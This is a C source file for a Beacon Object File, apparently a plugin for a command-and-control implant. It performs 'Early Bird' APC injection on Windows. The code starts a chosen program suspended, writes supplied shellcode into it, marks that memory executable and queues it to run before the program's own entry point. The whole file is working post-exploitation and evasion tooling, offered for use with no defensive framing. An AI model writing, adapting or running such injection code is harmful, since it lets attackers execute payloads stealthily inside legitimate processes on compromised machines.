/*
 * earlybird.c - Early Bird APC injection BOF
 *
 * Spawns a target process suspended, allocates memory, writes shellcode,
 * queues an APC to the main thread, and resumes. The APC fires before
 * the process entry point runs.
 *
 * Args:  target executable path (string), shellcode (binary blob)
 */

#include <windows.h>

#define BOF
#include "beacon.h"

/* ── DFR imports ── */
DFR(KERNEL32, CreateProcessA)
DFR(KERNEL32, VirtualAllocEx)
DFR(KERNEL32, WriteProcessMemory)
DFR(KERNEL32, VirtualProtectEx)
DFR(KERNEL32, QueueUserAPC)
DFR(KERNEL32, ResumeThread)
DFR(KERNEL32, TerminateProcess)
DFR(KERNEL32, CloseHandle)

void go(char* args, int len)
{
    datap parser;
    char* targetPath;
    int   targetPathLen;
    char* shellcode;
    int   shellcodeLen;

    BeaconDataParse(&parser, args, len);
    targetPath   = BeaconDataExtract(&parser, &targetPathLen);
    shellcode    = BeaconDataExtract(&parser, &shellcodeLen);

    if (targetPath == NULL || targetPathLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "earlybird: no target path provided");
        return;
    }
    if (shellcode == NULL || shellcodeLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "earlybird: no shellcode provided");
        return;
    }

    /* Create suspended process */
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;

    for (int i = 0; i < (int)sizeof(si); i++) ((char*)&si)[i] = 0;
    for (int i = 0; i < (int)sizeof(pi); i++) ((char*)&pi)[i] = 0;
    si.cb = sizeof(si);

    BOOL created = KERNEL32$CreateProcessA(
        NULL,
        targetPath,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!created) {
        BeaconPrintf(CALLBACK_ERROR, "earlybird: CreateProcessA failed for '%s'", targetPath);
        return;
    }

    /* Allocate RW memory in target process */
    PVOID remoteAddr = KERNEL32$VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcodeLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remoteAddr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "earlybird: VirtualAllocEx failed");
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /* Write shellcode into allocated memory */
    SIZE_T bytesWritten = 0;
    BOOL writeOk = KERNEL32$WriteProcessMemory(
        pi.hProcess,
        remoteAddr,
        shellcode,
        shellcodeLen,
        &bytesWritten
    );

    if (!writeOk) {
        BeaconPrintf(CALLBACK_ERROR, "earlybird: WriteProcessMemory failed");
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /* Flip memory protection from RW to RX */
    DWORD oldProtect = 0;
    BOOL protectOk = KERNEL32$VirtualProtectEx(
        pi.hProcess,
        remoteAddr,
        shellcodeLen,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (!protectOk) {
        BeaconPrintf(CALLBACK_ERROR, "earlybird: VirtualProtectEx failed");
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /* Queue APC - shellcode runs before the process entry point */
    DWORD apcResult = KERNEL32$QueueUserAPC(
        (PAPCFUNC)remoteAddr,
        pi.hThread,
        0
    );

    if (apcResult == 0) {
        BeaconPrintf(CALLBACK_ERROR, "earlybird: QueueUserAPC failed");
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        return;
    }

    /* Resume thread - APC fires before main entry */
    KERNEL32$ResumeThread(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "Early Bird APC injected into PID %d",
                 pi.dwProcessId);

    /* Cleanup */
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(pi.hProcess);
}
